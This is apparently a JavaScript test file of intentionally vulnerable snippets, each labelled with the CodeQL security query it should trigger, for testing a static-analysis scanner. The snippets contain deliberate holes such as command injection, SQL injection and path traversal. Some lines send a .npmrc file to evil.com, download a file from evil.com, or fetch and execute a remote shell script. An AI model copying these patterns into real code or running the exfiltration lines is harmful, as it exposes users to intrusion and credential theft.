// should trigger codeql/javascript/ql/src/Security/CWE-022/TaintedPath.ql

var fs = require('fs'),
    http = require('http'),
    url = require('url');

var server = http.createServer(function(req, res) {
  let path = url.parse(req.url, true).query.path;

  // BAD: This could read any file on the file system
  res.write(fs.readFileSync(path));

  // BAD: This could still read any file on the file system
  res.write(fs.readFileSync("/home/user/" + path));
});

// should trigger codeql/javascript/ql/src/Security/CWE-022/ZipSlip.ql

const fs = require('fs');
const unzip = require('unzip');

fs.createReadStream('archive.zip')
  .pipe(unzip.Parse())
  .on('entry', entry => {
    const fileName = entry.path;
    // BAD: This could write any file on the filesystem.
    entry.pipe(fs.createWriteStream(fileName));
  });

// should trigger codeql/javascript/ql/src/Security/CWE-073/TemplateObjectInjection.ql 

var app = require('express')();
app.set('view engine', 'hbs');

app.post('/', function (req, res, next) {
    var profile = req.body.profile;
    res.render('index', profile);
});

// should trigger codeql/javascript/ql/src/Security/CWE-078/IndirectCommandInjection.ql

var cp = require("child_process");

const args = process.argv.slice(2);
const script = path.join(__dirname, 'bin', 'main.js');
cp.execSync(`node ${script} ${args.join(' ')}"`); // BAD


// should trigger codeql/javascript/ql/src/Security/CWE-078/CommandInjection.ql

var cp = require("child_process"),
    http = require('http'),
    url = require('url');

var server = http.createServer(function(req, res) {
    let cmd = url.parse(req.url, true).query.path;

    cp.exec(cmd); // BAD
});

// should trigger codeql/javascript/ql/src/Security/CWE-078/UnsafeShellCommandConstruction.ql

var cp = require("child_process");

module.exports = function download(path, callback) {
  cp.exec("wget " + path, callback);
}

// should trigger codeql/javascript/ql/src/Security/CWE-078/ShellCommandInjectionFromEnvironment.ql 

var cp = require("child_process"),
  path = require("path");
function cleanupTemp() {
  let cmd = "rm -rf " + path.join(__dirname, "temp");
  cp.execSync(cmd); // BAD
}

// should trigger codeql/javascript/ql/src/Security/CWE-078/UselessUseOfCat.ql

var child_process = require('child_process');

module.exports = function (name) {
    return child_process.execSync("cat " + name).toString();
};

// should trigger codeql/javascript/ql/src/Security/CWE-089/SqlInjection.ql

const app = require("express")(),
      pg = require("pg"),
      pool = new pg.Pool(config);

app.get("search", function handler(req, res) {
  // BAD: the category might have SQL special characters in it
  var query1 =
    "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
    req.params.category +
    "' ORDER BY PRICE";
  pool.query(query1, [], function(err, results) {
    // process results
  });

  // GOOD: use parameters
  var query2 =
    "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1" + " ORDER BY PRICE";
  pool.query(query2, [req.params.category], function(err, results) {
    // process results
  });
});

// should trigger codeql/javascript/ql/src/Security/CWE-1004/ClientExposedCookie.ql

const http = require('http');

const server = http.createServer((req, res) => {
    res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h2>Hello world</h2>');
});

// should trigger codeql/javascript/ql/src/Security/CWE-117/LogInjection.ql

const http = require('http');
const url = require('url');

const server = http.createServer((req, res) => {
    let q = url.parse(req.url, true);

    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is
})

server.listen(3000, '127.0.0.1', () => {});

// should trigger codeql/javascript/ql/src/Security/CWE-1275/SameSiteNoneCookie.ql

const http = require('http');

const server = http.createServer((req, res) => {
    res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=None`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h2>Hello world</h2>');
});

// should trigger codeql/javascript/ql/src/Security/CWE-134/TaintedFormatString.ql

const app = require("express")();

app.get("unauthorized", function handler(req, res) {
  let user = req.query.user;
  let ip = req.connection.remoteAddress;
  console.log("Unauthorized access attempt by " + user, ip);
});

// should trigger codeql/javascript/ql/src/Security/CWE-178/CaseSensitiveMiddlewarePath.ql

const app = require('express')();

app.use(/\/admin\/.*/, (req, res, next) => {
    if (!req.user.isAdmin) {
        res.status(401).send('Unauthorized');
    } else {
        next();
    }
});

app.get('/admin/users/:id', (req, res) => {
    res.send(app.database.users[req.params.id]);
});

// should trigger codeql/javascript/ql/src/Security/CWE-200/FileAccessToHttp.ql

var fs = require("fs"),
    https = require("https");

var content = fs.readFileSync(".npmrc", "utf8");
https.get({
  hostname: "evil.com",
  path: "/upload",
  method: "GET",
  headers: { Referer: content }
}, () => { });

// should trigger codeql/javascript/ql/src/Security/CWE-200/PrivateFileExposure.ql


var express = require('express');

var app = express();

app.use('/node_modules', express.static(path.resolve(__dirname, '../node_modules')));

// should trigger codeql/javascript/ql/src/Security/CWE-201/PostMessageStar.ql

window.parent.postMessage(userName, '*');

// should trigger codeql/javascript/ql/src/Security/CWE-209/StackTraceExposure.ql

var http = require('http');

http.createServer(function onRequest(req, res) {
  var body;
  try {
    body = handleRequest(req);
  }
  catch (err) {
    res.statusCode = 500;
    res.setHeader("Content-Type", "text/plain");
    res.end(err.stack); // NOT OK
    return;
  }
  res.statusCode = 200;
  res.setHeader("Content-Type", "application/json");
  res.setHeader("Content-Length", body.length);
  res.end(body);
}).listen(3000);

// should trigger codeql/javascript/ql/src/Security/CWE-295/DisablingCertificateValidation.ql

let https = require("https");

https.request(
  {
    hostname: "secure.my-online-bank.com",
    port: 443,
    method: "POST",
    path: "send-confidential-information",
    rejectUnauthorized: false // BAD
  },
  response => {
    // ... communicate with secure.my-online-bank.com
  }
);


// should trigger codeql/javascript/ql/src/Security/CWE-312/BuildArtifactLeak.ql

const webpack = require("webpack");

module.exports = [{
    plugins: [
        new webpack.DefinePlugin({
            "process.env": JSON.stringify(process.env)
        })
    ]
}];

// should trigger codeql/javascript/ql/src/Security/CWE-312/CleartextLogging.ql OR codeql/javascript/ql/src/Security/CWE-312/CleartextStorage.ql

var express = require('express');

var app = express();
app.get('/remember-password', function (req, res) {
  let pw = req.param("current_password");
  // BAD: Setting a cookie value with cleartext sensitive data.
  res.cookie("password", pw);
});

// should trigger codeql/javascript/ql/src/Security/CWE-327/BadRandomness.ql 

const crypto = require('crypto');

const digits = [];
for (let i = 0; i < 10; i++) {
    digits.push(crypto.randomBytes(1)[0] % 10); // NOT OK
}

// should trigger codeql/javascript/ql/src/Security/CWE-327/BrokenCryptoAlgorithm.ql

const crypto = require('crypto');

var secretText = obj.getSecretText();

const desCipher = crypto.createCipher('des', key);
let desEncrypted = desCipher.write(secretText, 'utf8', 'hex'); // BAD: weak encryption

// should trigger codeql/javascript/ql/src/Security/CWE-338/InsecureRandomness.ql

function insecurePassword() {
    // BAD: the random suffix is not cryptographically secure
    var suffix = Math.random();
    var password = "myPassword" + suffix;
    return password;
}

// should trigger codeql/javascript/ql/src/Security/CWE-346/CorsMisconfigurationForCredentials.ql

var https = require('https'),
    url = require('url');

var server = https.createServer(function(){});

server.on('request', function(req, res) {
    let origin = url.parse(req.url, true).query.origin;
     // BAD: attacker can choose the value of origin
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", true);

    // ...
});

// should trigger codeql/javascript/ql/src/Security/CWE-347/MissingJWTKeyVerification.ql

const jwt = require("jsonwebtoken");

const secret = "my-secret-key";

var token = jwt.sign({ foo: 'bar' }, secret, { algorithm: "none" })
jwt.verify(token, false, { algorithms: ["HS256", "none"] })

// should trigger codeql/javascript/ql/src/Security/CWE-352/MissingCsrfMiddleware.ql

var app = require("express")(),
  cookieParser = require("cookie-parser"),
  passport = require("passport");

app.use(cookieParser());
app.use(passport.authorize({ session: true }));

app.post("/changeEmail", function(req, res) {
  let newEmail = req.cookies["newEmail"];
  // ...
});

// should trigger codeql/javascript/ql/src/Security/CWE-367/FileSystemRace.ql

const fs = require("fs");
const os = require("os");
const path = require("path");

const filePath = path.join(os.tmpdir(), "my-temp-file.txt");

if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, "Hello", { mode: 0o600 });
}

// should trigger codeql/javascript/ql/src/Security/CWE-377/InsecureTemporaryFile.ql

const fs = require('fs');
const os = require('os');
const path = require('path');

const file = path.join(os.tmpdir(), "test-" + (new Date()).getTime() + ".txt");
fs.writeFileSync(file, "content");

// should trigger codeql/javascript/ql/src/Security/CWE-384/SessionFixation.ql

const express = require('express');
const session = require('express-session');
var bodyParser = require('body-parser')
const app = express();
app.use(bodyParser.urlencoded({ extended: false }))
app.use(session({
    secret: 'keyboard cat'
}));

app.post('/login', function (req, res) {
    // Check that username password matches
    if (req.body.username === 'admin' && req.body.password === 'admin') {
        req.session.authenticated = true;
        res.redirect('/');
    } else {
        res.redirect('/login');
    }
});

// should trigger codeql/javascript/ql/src/Security/CWE-400/DeepObjectResourceExhaustion.ql

import express from 'express';
import Ajv from 'ajv';

let ajv = new Ajv({ allErrors: true });
ajv.addSchema(require('./input-schema'), 'input');

var app = express();
app.get('/user/:id', function(req, res) {
	if (!ajv.validate('input', req.body)) {
		res.end(ajv.errorsText());
		return;
	}
	// ...
});

// should trigger codeql/javascript/ql/src/Security/CWE-400/RemotePropertyInjection.ql

var express = require('express');

var app = express();
var myObj = {}

app.get('/user/:id', function(req, res) {
	var prop = req.query.userControlled; // BAD
	myObj[prop] = function() {};
	console.log("Request object " + myObj);
});

// should trigger codeql/javascript/ql/src/Security/CWE-451/MissingXFrameOptions.ql

var express = require('express'),
    app = express();


app.get('/', function (req, res) {
    res.send('X-Frame-Options: ' + res.get('X-Frame-Options'))
})
var express = require('express'),
    app = express();


app.get('/', function (req, res) {
    res.set('X-Frame-Options', value)
    res.send('X-Frame-Options: ' + res.get('X-Frame-Options'))
})

// should trigger codeql/javascript/ql/src/Security/CWE-502/UnsafeDeserialization.ql

const app = require("express")(),
  jsyaml = require("js-yaml");

app.get("load", function(req, res) {
  let data = jsyaml.load(req.params.data);
  // ...
});

// should trigger codeql/javascript/ql/src/Security/CWE-506/HardcodedDataInterpretedAsCode.ql 

var r = require;

function e(r) {
  return Buffer.from(r, "hex").toString()
}

// BAD: hexadecimal constant decoded and interpreted as import path
var n = r(e("2e2f746573742f64617461"));

// should trigger codeql/javascript/ql/src/Security/CWE-598/SensitiveGetQuery.ql
const express = require('express');
const app = express();
app.use(require('body-parser').urlencoded({ extended: false }))

// bad: sensitive information is read from query parameters
app.get('/login1', (req, res) => {
    const user = req.query.user;
    const password = req.query.password;
    if (checkUser(user, password)) {
        res.send('Welcome');
    } else {
        res.send('Access denied');
    }
});

// good: sensitive information is read from post body
app.post('/login2', (req, res) => {
    const user = req.body.user;
    const password = req.body.password;
    if (checkUser(user, password)) {
        res.send('Welcome');
    } else {
        res.send('Access denied');
    }
});

// should trigger codeql/javascript/ql/src/Security/CWE-601/ServerSideUrlRedirect.ql

const app = require("express")();

app.get('/some/path', function(req, res) {
  // BAD: a request parameter is incorporated without validation into a URL redirect
  res.redirect(req.param("target"));
});

// should trigger codeql/javascript/ql/src/Security/CWE-601/ClientSideUrlRedirect.ql

window.location = /.*redirect=([^&]*).*/.exec(document.location.href)[1];

// should trigger codeql/javascript/ql/src/Security/CWE-611/Xxe.ql

const app = require("express")(),
  libxml = require("libxmljs");

app.post("upload", (req, res) => {
  let xmlSrc = req.body,
    doc = libxml.parseXml(xmlSrc, { noent: true });
});

// should trigger codeql/javascript/ql/src/Security/CWE-614/ClearTextCookie.ql

const http = require('http');

const server = http.createServer((req, res) => {
    res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h2>Hello world</h2>');
});

// should trigger codeql/javascript/ql/src/Security/CWE-640/HostHeaderPoisoningInEmailGeneration.ql

let nodemailer = require('nodemailer');
let express = require('express');
let backend = require('./backend');

let app = express();

let config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

app.post('/resetpass', (req, res) => {
  let email = req.query.email;
  let transport = nodemailer.createTransport(config.smtp);
  let token = backend.getUserSecretResetToken(email);
  transport.sendMail({
    from: 'webmaster@example.com',
    to: email,
    subject: 'Forgot password',
    text: `Click to reset password: https://${req.host}/resettoken/${token}`,
  });
});

// should trigger codeql/javascript/ql/src/Security/CWE-643/XpathInjection.ql

const express = require('express');
const xpath = require('xpath');
const app = express();

app.get('/some/route', function(req, res) {
  let userName = req.param("userName");

  // BAD: Use user-provided data directly in an XPath expression
  let badXPathExpr = xpath.parse("//users/user[login/text()='" + userName + "']/home_dir/text()");
  badXPathExpr.select({
    node: root
  });
});

// should trigger codeql/javascript/ql/src/Security/CWE-730/RegExpInjection.ql

var express = require('express');
var app = express();

app.get('/findKey', function(req, res) {
  var key = req.param("key"), input = req.param("input");

  // BAD: Unsanitized user input is used to construct a regular expression
  var re = new RegExp("\\b" + key + "=(.*)\n");
});

// should trigger codeql/javascript/ql/src/Security/CWE-730/ServerCrash.ql

const express = require("express"),
  fs = require("fs");

function save(rootDir, path, content) {
  if (!isValidPath(rootDir, req.query.filePath)) {
    throw new Error(`Invalid filePath: ${req.query.filePath}`); // BAD crashes the server
  }
  // write content to disk
}
express().post("/save", (req, res) => {
  fs.exists(rootDir, (exists) => {
    if (!exists) {
      console.error(`Server setup is corrupted, ${rootDir} does not exist!`);
      res.status(500);
      res.end();
      return;
    }
    save(rootDir, req.query.path, req.body);
    res.status(200);
    res.end();
  });
});

// should trigger codeql/javascript/ql/src/Security/CWE-754/UnvalidatedDynamicMethodCall.ql

var express = require('express');
var app = express();

var actions = {
  play(data) {
    // ...
  },
  pause(data) {
    // ...
  }
}

app.get('/perform/:action/:payload', function(req, res) {
  let action = actions[req.params.action];
  // BAD: `action` may not be a function
  res.end(action(req.params.payload));
});

// should trigger codeql/javascript/ql/src/Security/CWE-770/MissingRateLimiting.ql

var express = require('express');
var app = express();

app.get('/:path', function(req, res) {
  let path = req.params.path;
  if (isValidPath(path))
    res.sendFile(path);
});

// should trigger codeql/javascript/ql/src/Security/CWE-770/ResourceExhaustion.ql (3)

var http = require("http"),
    url = require("url");

var server = http.createServer(function(req, res) {
	var size = parseInt(url.parse(req.url, true).query.size);

	let dogs = new Array(size).fill("dog"); // BAD

	// ... use the dog
});

var http = require("http"),
    url = require("url");

var server = http.createServer(function(req, res) {
	var size = parseInt(url.parse(req.url, true).query.size);

	let buffer = Buffer.alloc(size); // BAD

	// ... use the buffer
});

var http = require("http"),
    url = require("url");

var server = http.createServer(function(req, res) {
	var delay = parseInt(url.parse(req.url, true).query.delay);

	setTimeout(f, delay); // BAD

});

// should trigger codeql/javascript/ql/src/Security/CWE-776/XmlBomb.ql

const app = require("express")(),
  expat = require("node-expat");

app.post("upload", (req, res) => {
  let xmlSrc = req.body,
    parser = new expat.Parser();
  parser.on("startElement", handleStart);
  parser.on("text", handleText);
  parser.write(xmlSrc);
});

// should trigger codeql/javascript/ql/src/Security/CWE-798/HardcodedCredentials.ql

const pg = require("pg");

const client = new pg.Client({
  user: "bob",
  host: "database.server.com",
  database: "mydb",
  password: "correct-horse-battery-staple",
  port: 3211
});
client.connect();

// should trigger codeql/javascript/ql/src/Security/CWE-807/ConditionalBypass.ql OR codeql/javascript/ql/src/Security/CWE-807/DifferentKindsComparisonBypass.ql 

var express = require('express');
var app = express();
// ...
app.get('/full-profile/:userId', function(req, res) {

    if (req.cookies.loggedInUserId !== req.params.userId) {
        // BAD: login decision made based on user controlled data
        requireLogin();
    } else {
        // ... show private information
    }

});

// should trigger codeql/javascript/ql/src/Security/CWE-829/InsecureDownload.ql

const fetch = require("node-fetch");
const cp = require("child_process");

fetch('http://mydownload.example.org/myscript.sh')
    .then(res => res.text())
    .then(script => cp.execSync(script));

// should trigger codeql/javascript/ql/src/Security/CWE-830/FunctionalityFromUntrustedSource.ql

<html>
    <head>
        <title>jQuery demo</title>
        <script src="http://code.jquery.com/jquery-3.6.0.slim.min.js" crossorigin="anonymous"></script>
    </head>
    <body>
        ...
    </body>
</html>

// should trigger codeql/javascript/ql/src/Security/CWE-834/LoopBoundInjection.ql

var express = require('express');
var app = express();

app.post("/foo", (req, res) => {
    var obj = req.body;

    var ret = [];

    // Potential DoS if obj.length is large.
    for (var i = 0; i < obj.length; i++) {
        ret.push(obj[i]);
    }
});

// should trigger codeql/javascript/ql/src/Security/CWE-843/TypeConfusionThroughParameterTampering.ql

var app = require("express")(),
  path = require("path");

app.get("/user-files", function(req, res) {
  var file = req.param("file");
  if (file.indexOf("..") !== -1) {
    // BAD
    // we forbid relative paths that contain ..
    // as these could leave the public directory
    res.status(400).send("Bad request");
  } else {
    var absolute = path.resolve("/public/" + file);
    console.log("Sending file: %s", absolute);
    res.sendFile(absolute);
  }
});

// should trigger codeql/javascript/ql/src/Security/CWE-912/HttpToFileAccess.ql

var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', res => {
  res.on("data", d => {
    fs.writeFileSync("/tmp/script", d)
  })
});

// should trigger codeql/javascript/ql/src/Security/CWE-915/PrototypePollutingAssignment.ql 

let express = require('express');
let app = express()

app.put('/todos/:id', (req, res) => {
    let id = req.params.id;
    let items = req.session.todos[id];
    if (!items) {
        items = req.session.todos[id] = {};
    }
    items[req.query.name] = req.query.text;
    res.end(200);
});

// should trigger codeql/javascript/ql/src/Security/CWE-915/PrototypePollutingFunction.ql

function merge(dst, src) {
    for (let key in src) {
        if (!src.hasOwnProperty(key)) continue;
        if (isObject(dst[key])) {
            merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}

// should trigger codeql/javascript/ql/src/Security/CWE-915/PrototypePollutingMergeCall.ql 

app.get('/news', (req, res) => {
  let prefs = lodash.merge({}, JSON.parse(req.query.prefs));
})

app.get('/news', (req, res) => {
  let config = lodash.merge({}, {
    prefs: req.query.prefs
  });
})

// should trigger codeql/javascript/ql/src/Security/CWE-916/InsufficientPasswordHash.ql

const crypto = require("crypto");
function hashPassword(password) {
    var hasher = crypto.createHash('md5');
    var hashed = hasher.update(password).digest("hex"); // BAD
    return hashed;
}

// should trigger codeql/javascript/ql/src/Security/CWE-918/ClientSideRequestForgery.ql

async function loadMessage() {
    const query = new URLSearchParams(location.search);
    const url = '/api/messages/' + query.get('message_id');
    const data = await (await fetch(url)).json();
    document.getElementById('message').innerHTML = data.html;
}

// should trigger codeql/javascript/ql/src/Security/CWE-918/RequestForgery.ql

import http from 'http';
import url from 'url';

var server = http.createServer(function(req, res) {
    var target = url.parse(req.url, true).query.target;

    // BAD: `target` is controlled by the attacker
    http.get('https://' + target + ".example.com/data/", res => {
        // process request response ...
    });

});
